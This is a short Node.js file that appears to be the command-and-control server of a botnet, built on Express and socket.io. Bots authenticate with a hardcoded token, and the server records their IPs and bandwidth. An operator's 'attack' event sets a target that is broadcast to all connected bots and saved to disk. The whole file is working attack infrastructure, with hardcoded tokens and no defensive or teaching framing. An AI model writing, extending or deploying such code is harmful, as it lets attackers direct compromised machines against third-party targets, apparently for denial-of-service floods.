const app = require('express')();
const server = require('http').createServer(app);
const options = { /* ... */ };

const io = require('socket.io')(server, options);
const bodyParser = require('body-parser');

const path = require('path');
const fs = require('fs');

app.use(bodyParser.urlencoded({ extended: true }));

global.BOTS = []                                                    //Global array of connected bots.

var bot_auth_token = "40d5f910719ff4cc7352c4d09bfd4803";
var manager_auth_token = "65ebb4ce0fbdad63f516815bf4f6ce3f";
var manager_auth_token_web = "887fd6be8896e02209d34e2f559951b9";

global.current_target = fs.readFileSync('./db/target.txt', 'utf-8');


var bots = io.of('/client');                                        //Bot connection route
var managers = io.of('/manager');                                   //Manager connection route.

app.get('/', (req, res) => {
    res.redirect('/login');
}) 

app.post('/dash', (req, res) => {
    if(req.body.submit && req.body.token === manager_auth_token_web) {
        res.sendFile(path.join(__dirname+"/dash/dash.html"));
    } else {
        res.redirect('/login?auth=failed');
    }
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname+"/dash/login.html"));
});

//----------------------------------------------------------------

//Bot related stuff
bots.on('connection', (bot) => { 
    
    checkBot(bot);
    
    bot.on('disconnect', () => {
        //console.log("BOT_DISSCONNECT");
        removeBot(bot.id);
    });
});

//Manager related stuff
managers.on('connection', manager => { 

    checkManager(manager);

    manager.on("attack", (attackquery) => {
        console.log(attackquery, "hey")
        updateTarget(attackquery);
        
    })

});


//------------------------------------------------------------------

//Bot authenticator 
function checkBot(bot) {
    //Bot auth check 
    if(bot.handshake.headers['auth'] && bot.handshake.headers['auth'] == bot_auth_token) {
        //Authentication success
        BOTS.push({id: bot.id, ip: bot.handshake.address, mbps: ""})
        sendBots2Man()
        sendCurrentTarget2bot(bot);
    } else {
        bot.disconnect();
    }
    
}

function sendCurrentTarget2bot(bot) {
    if(bot) {
        bot.emit('target', current_target);
    } else {
        bots.emit('target', current_target);
    }
}

function removeBot(id) {
    
    BOTS.forEach(function(bot, index) {
        if(bot.id === id ){
            BOTS.splice(index, 1)
            console.log(bot.id, 'REMOVED')
        }
        
        sendBots2Man();
    });
    
}

//---------------------------------------------------------------------
//Check Manager 
function checkManager(manager) {
    if(manager.handshake.headers['auth'] && manager.handshake.headers['auth'] == manager_auth_token) {
        //Sending current target to manager.
        manager.emit('target', current_target);
        //Authentication success.
        sendTarget2Man(manager);
        sendBots2Man(manager);
    } else {
        manager.disconnect();
    }
}

function sendBots2Man(manager) {
    if(manager) {
        manager.emit('bots', BOTS);
    } else {
        managers.emit('bots', BOTS);
    }
}
function sendTarget2Man(manager) {
    if(manager) {
        manager.emit('target', current_target);
    } else {
        managers.emit('target', current_target);
    }
}
 
function updateTarget(target) {
    //Setting new target.
    current_target = target;
    //sending target to bots.
    sendCurrentTarget2bot();
    sendTarget2Man();
    //saving target on disk.
    fs.writeFileSync('./db/target.txt', target);
}

server.listen(3000);
